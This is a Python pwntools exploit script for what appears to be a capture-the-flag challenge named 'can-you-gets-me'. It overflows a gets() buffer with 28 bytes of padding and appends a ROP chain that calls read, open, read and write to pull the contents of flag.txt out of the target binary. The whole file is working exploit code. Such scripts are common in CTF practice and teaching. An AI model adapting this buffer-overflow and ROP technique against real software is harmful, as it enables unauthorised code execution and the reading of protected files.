#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('/problems/can-you-gets-me_4_f269dbca3097204b5d4a0064467b0a8c/gets')


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, cwd = '/problems/can-you-gets-me_4_f269dbca3097204b5d4a0064467b0a8c/', *a, **kw)

gdbscript = '''
break *0x080488A2
continue
'''.format(**locals())

# -- Exploit goes here --

context.terminal = ['gnome-terminal', '-e']
io = start()

bss_addr = 0x080eaf80

rop = ROP(exe)
rop.read(0, bss_addr, 32)
rop.open(bss_addr, 0)
rop.read(3, bss_addr, 32)
rop.write(1, bss_addr, 32)

log.info(rop.dump())

payload = "A" * 28 + rop.chain()
io.sendlineafter('!', payload)
io.send('flag.txt')

io.interactive()

